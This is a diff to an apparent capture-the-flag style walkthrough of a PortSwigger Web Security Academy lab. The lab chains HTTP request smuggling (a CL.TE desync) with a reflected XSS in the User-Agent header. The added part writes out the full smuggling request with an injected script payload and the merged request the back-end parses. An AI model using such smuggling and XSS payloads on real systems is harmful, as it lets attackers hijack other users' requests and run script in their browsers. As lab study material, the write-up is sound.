@@ -80,13 +80,35 @@ Following the redirect:
 
 Now that we have found the desync vulnerability we need to find the reflected vulnerability. Inspecting the creation of new comment request we can see that the user-agent header is passes as parameter:
 -- 68 --
-Moreover inspecting the post's comment page we can see that the value is reflected into a hidden input field:
+Moreover inspecting the post's comment page we can see that the value is reflected into a hidden input field
 -- 69 --
 Let's try to inject the user-agent header:
 -- 70 --
-So our JS payload is reflected, sending the request to the browser (right click on the request body, then 1, 2) we get the alert pop-up.
+So our JS payload is reflected, sending the request to the browser (right click on the request body, then 1, 2), copy the provided link into your browser and you get the alert pop-up into the response (eventually you could just use Show response in browser, 3)
+-- 71 --
+Finally we can combine the two vulnerability to solve the lab using the following payload:
+```
+POST / HTTP/1.1
+Host: 0a6200a0045c84b0c1db9e7e00630001.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Transfer-Encoding: chunked
 
+0
 
+GET /post?postId=1 HTTP/1.1
+User-Agent: "><script>alert(1);</script>
+```
+In the above POST request the front-end  will pass the  GET as body to the back-end, that understands the transfer-encoding, will treat it as belonging (prepending) to the next request, for istance. Now, after having submitted the exploit, if you visit the post ID 5 you will see the pop-up alert appearing, before to land to the post ID 5 page, since the server will parse the following request:
+```
+GET /post?postId=1 HTTP/1.1
+User-Agent: "><script>alert(1);</script>GET /post?postId=5 HTTP/1.1
+Host: 0a6200a0045c84b0c1db9e7e00630001.web-security-academy.net
+Cookie: session=Wq6CtAqrwzJDZbfX6NZM4Ncn8ZhyCWK1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+...
+```
+Submit the exploit a couple of time and you will see that the Lab is solved
 
 
 
